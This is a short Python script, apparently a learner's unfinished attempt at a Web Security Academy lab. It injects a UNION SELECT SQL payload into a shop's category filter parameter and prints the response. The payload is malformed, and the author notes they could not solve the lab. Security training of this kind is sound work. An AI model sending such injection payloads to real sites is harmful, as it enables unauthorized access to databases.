""""
import requests
from bs4 import BeautifulSoup
s = requests.Session()

url = f"https://acf91f221e9e18ae800a12ea000a004b.web-security-academy.net/filter?category=Gifts' UNION SELECT 8.0.23 --"
resp = s.get(url)
soup = BeautifulSoup(resp.text,'html.parser')
if warn := soup.find('p', {'class':'is-warning'}):
    print(warn.text)
else:
    print(resp.text)
"""

'''Couldnt figure this one out'''